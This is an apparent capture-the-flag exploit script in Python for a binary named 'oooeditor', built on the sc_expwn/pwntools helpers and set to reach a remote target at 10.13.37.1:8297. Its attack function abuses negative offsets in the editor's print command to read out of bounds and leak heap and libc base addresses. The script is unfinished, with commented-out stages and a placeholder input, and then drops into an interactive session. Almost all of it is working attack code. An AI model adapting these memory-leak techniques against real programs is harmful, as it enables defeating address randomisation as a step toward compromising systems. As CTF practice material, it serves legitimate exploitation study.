#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './oooeditor'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'10.13.37.1', 'port':8297})
env.select()

#==========

binf = ELF(bin_file)
'''
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
addr_main           = binf.sep_function['main']
'''

libc = binf.libc
'''
offset_libc_main        = libc.sep_function['__libc_start_main']
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
'''

#==========

def attack(conn):
    edit = Editor(conn)

    edit.open('b.jpg')
    edit.open('a.png')
    edit.open('b.jpg')
    prev_size = u(edit.print_file(0x8, -0x10))
    info('prev_size     = 0x{:08x}'.format(prev_size))

    data = edit.print_file(0x10, -prev_size)
    addr_heap_base          = u64(data[0:0+8]) - 0x1e9f90
    addr_buf                = addr_heap_base + 0x20e730
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    addr_libc_mainarena     = u64(data[8:8+8]) - 0x7c8
    libc.address            = addr_libc_mainarena - 0x3c4b20
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))


    '''
    conn.recvuntil('> ')
    conn.sendline('hoge')

    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    '''

def dump(edit, name):
    edit.open(name)
    size = u(edit.print_file(0x8, -0x8))
    data = edit.print_file(size)
    open(name, 'wb').write(data)
    
class Editor:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def open(self, name):
        self.sendlineafter(']> ', 'o {}'.format(name))

    def print_file(self, size, offset=0):
        self.sendlineafter(']> ', ('p {} @{}'.format(size, offset)) if offset != 00 else ('p {}'.format(size)))
        data = self.recvuntil('[0x', drop=True)

        raw = ''
        for l in data.split('\n'):
            raw += ''.join(l.split(' | ')[0].split()).decode('hex')
        return raw

    def write_file(self, c, offset=0):
        self.sendlineafter(']> ', ('w {} @{}'.format(ord(c), offset)) if offset != 00 else ('w {}'.format(ord(c))))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
